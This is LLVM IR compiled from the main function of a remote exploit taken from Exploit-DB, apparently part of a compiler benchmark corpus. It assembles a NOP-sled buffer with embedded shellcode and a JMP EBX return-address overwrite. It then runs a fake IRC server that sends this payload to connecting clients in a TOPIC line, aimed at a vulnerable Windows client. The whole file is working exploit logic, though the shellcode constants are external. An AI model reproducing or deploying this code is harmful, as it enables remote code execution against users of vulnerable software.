; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19449.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19449.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@SIGCHLD = common dso_local global i32 0, align 4
@handleSIGCHLD = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@BUFEND = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i8* null, align 8
@FUNC = common dso_local global i8* null, align 8
@COMMAND = common dso_local global i8* null, align 8
@CMDLENP = common dso_local global i64 0, align 8
@RETADR = common dso_local global i32 0, align 4
@JMP_EBX_ADR = common dso_local global i32 0, align 4
@JMPS = common dso_local global i8 0, align 1
@JMPADR = common dso_local global i64 0, align 8
@JMPOFS = common dso_local global i8 0, align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"bind\00", align 1
@errno = common dso_local global i64 0, align 8
@EINTR = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@OPENING_MSG = common dso_local global i8* null, align 8
@JOIN1 = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@JOIN2 = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [41 x i8] c":fucker!~fuck@127.0.0.1 TOPIC #fuck :%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [30000 x i8], align 16
  %13 = alloca [10000 x i8], align 16
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @SIGCHLD, align 4
  %17 = load i32, i32* @handleSIGCHLD, align 4
  %18 = call i32 @signal(i32 %16, i32 %17)
  %19 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %20 = load i32, i32* @NOP, align 4
  %21 = load i64, i64* @BUFEND, align 8
  %22 = call i32 @memset(i8* %19, i32 %20, i64 %21)
  %23 = load i8*, i8** @exploit_code, align 8
  %24 = load i8*, i8** @FUNC, align 8
  %25 = call i32 @strcat(i8* %23, i8* %24)
  %26 = load i8*, i8** @exploit_code, align 8
  %27 = load i8*, i8** @COMMAND, align 8
  %28 = call i32 @strcat(i8* %26, i8* %27)
  %29 = load i8*, i8** @COMMAND, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = trunc i32 %30 to i8
  %32 = load i8*, i8** @exploit_code, align 8
  %33 = load i64, i64* @CMDLENP, align 8
  %34 = getelementptr inbounds i8, i8* %32, i64 %33
  store i8 %31, i8* %34, align 1
  %35 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %36 = load i32, i32* @RETADR, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  %40 = load i8*, i8** @exploit_code, align 8
  %41 = load i8*, i8** @exploit_code, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = call i32 @strncpy(i8* %39, i8* %40, i32 %42)
  %44 = load i32, i32* @JMP_EBX_ADR, align 4
  store i32 %44, i32* %11, align 4
  %45 = load i8, i8* @JMPS, align 1
  %46 = load i64, i64* @JMPADR, align 8
  %47 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %46
  store i8 %45, i8* %47, align 1
  %48 = load i8, i8* @JMPOFS, align 1
  %49 = load i64, i64* @JMPADR, align 8
  %50 = add i64 %49, 1
  %51 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %50
  store i8 %48, i8* %51, align 1
  %52 = load i32, i32* %11, align 4
  %53 = ashr i32 %52, 24
  %54 = and i32 255, %53
  %55 = trunc i32 %54 to i8
  %56 = load i32, i32* @RETADR, align 4
  %57 = add nsw i32 %56, 3
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %58
  store i8 %55, i8* %59, align 1
  %60 = load i32, i32* %11, align 4
  %61 = ashr i32 %60, 16
  %62 = and i32 255, %61
  %63 = trunc i32 %62 to i8
  %64 = load i32, i32* @RETADR, align 4
  %65 = add nsw i32 %64, 2
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %66
  store i8 %63, i8* %67, align 1
  %68 = load i32, i32* %11, align 4
  %69 = ashr i32 %68, 8
  %70 = and i32 255, %69
  %71 = trunc i32 %70 to i8
  %72 = load i32, i32* @RETADR, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %74
  store i8 %71, i8* %75, align 1
  %76 = load i32, i32* %11, align 4
  %77 = and i32 %76, 255
  %78 = trunc i32 %77 to i8
  %79 = load i32, i32* @RETADR, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %80
  store i8 %78, i8* %81, align 1
  %82 = load i64, i64* @BUFEND, align 8
  %83 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 %82
  store i8 0, i8* %83, align 1
  %84 = load i32, i32* @PF_INET, align 4
  %85 = load i32, i32* @SOCK_STREAM, align 4
  %86 = call i32 @socket(i32 %84, i32 %85, i32 0)
  store i32 %86, i32* %6, align 4
  %87 = icmp slt i32 %86, 0
  br i1 %87, label %88, label %91

88:                                               ; preds = %2
  %89 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %90 = call i32 @exit(i32 1) #3
  unreachable

91:                                               ; preds = %2
  %92 = bitcast %struct.sockaddr_in* %14 to i8*
  %93 = call i32 @bzero(i8* %92, i32 12)
  %94 = load i32, i32* @PF_INET, align 4
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %94, i32* %95, align 4
  %96 = load i32, i32* @INADDR_ANY, align 4
  %97 = call i32 @htonl(i32 %96)
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %99 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %98, i32 0, i32 0
  store i32 %97, i32* %99, align 4
  %100 = load i32, i32* @PORT, align 4
  %101 = call i32 @htons(i32 %100)
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i32 %101, i32* %102, align 4
  %103 = load i32, i32* %6, align 4
  %104 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %105 = call i64 @bind(i32 %103, %struct.sockaddr* %104, i32 12)
  %106 = icmp slt i64 %105, 0
  br i1 %106, label %107, label %110

107:                                              ; preds = %91
  %108 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %109 = call i32 @exit(i32 1) #3
  unreachable

110:                                              ; preds = %91
  %111 = load i32, i32* %6, align 4
  %112 = call i32 @listen(i32 %111, i32 5)
  br label %113

113:                                              ; preds = %110, %123, %169
  store i32 12, i32* %9, align 4
  %114 = load i32, i32* %6, align 4
  %115 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %116 = call i32 @accept(i32 %114, %struct.sockaddr* %115, i32* %9)
  store i32 %116, i32* %7, align 4
  %117 = load i32, i32* %7, align 4
  %118 = icmp slt i32 %117, 0
  br i1 %118, label %119, label %127

119:                                              ; preds = %113
  %120 = load i64, i64* @errno, align 8
  %121 = load i64, i64* @EINTR, align 8
  %122 = icmp eq i64 %120, %121
  br i1 %122, label %123, label %124

123:                                              ; preds = %119
  br label %113

124:                                              ; preds = %119
  %125 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %126 = call i32 @exit(i32 1) #3
  unreachable

127:                                              ; preds = %113
  %128 = call i32 (...) @fork()
  store i32 %128, i32* %8, align 4
  %129 = icmp slt i32 %128, 0
  br i1 %129, label %130, label %133

130:                                              ; preds = %127
  %131 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %132 = call i32 @exit(i32 1) #3
  unreachable

133:                                              ; preds = %127
  %134 = load i32, i32* %8, align 4
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %166

136:                                              ; preds = %133
  %137 = load i32, i32* %6, align 4
  %138 = call i32 @close(i32 %137)
  %139 = load i32, i32* %7, align 4
  %140 = load i8*, i8** @OPENING_MSG, align 8
  %141 = load i8*, i8** @OPENING_MSG, align 8
  %142 = call i32 @strlen(i8* %141)
  %143 = call i32 @send(i32 %139, i8* %140, i32 %142, i32 0)
  %144 = load i32, i32* %7, align 4
  %145 = load i8*, i8** @JOIN1, align 8
  %146 = load i8*, i8** @JOIN1, align 8
  %147 = call i32 @strlen(i8* %146)
  %148 = call i32 @send(i32 %144, i8* %145, i32 %147, i32 0)
  %149 = load i32, i32* %7, align 4
  %150 = call i32 @send(i32 %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 1, i32 0)
  %151 = load i32, i32* %7, align 4
  %152 = load i8*, i8** @JOIN2, align 8
  %153 = getelementptr inbounds [30000 x i8], [30000 x i8]* %12, i64 0, i64 0
  %154 = call i32 @strlen(i8* %153)
  %155 = call i32 @send(i32 %151, i8* %152, i32 %154, i32 0)
  %156 = getelementptr inbounds [30000 x i8], [30000 x i8]* %12, i64 0, i64 0
  %157 = getelementptr inbounds [10000 x i8], [10000 x i8]* %13, i64 0, i64 0
  %158 = call i32 @sprintf(i8* %156, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0), i8* %157)
  %159 = load i32, i32* %7, align 4
  %160 = getelementptr inbounds [30000 x i8], [30000 x i8]* %12, i64 0, i64 0
  %161 = getelementptr inbounds [30000 x i8], [30000 x i8]* %12, i64 0, i64 0
  %162 = call i32 @strlen(i8* %161)
  %163 = call i32 @send(i32 %159, i8* %160, i32 %162, i32 0)
  %164 = call i32 @sleep(i32 1800)
  %165 = call i32 @exit(i32 0) #3
  unreachable

166:                                              ; preds = %133
  %167 = load i32, i32* %7, align 4
  %168 = call i32 @close(i32 %167)
  br label %169

169:                                              ; preds = %166
  br label %113
}

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
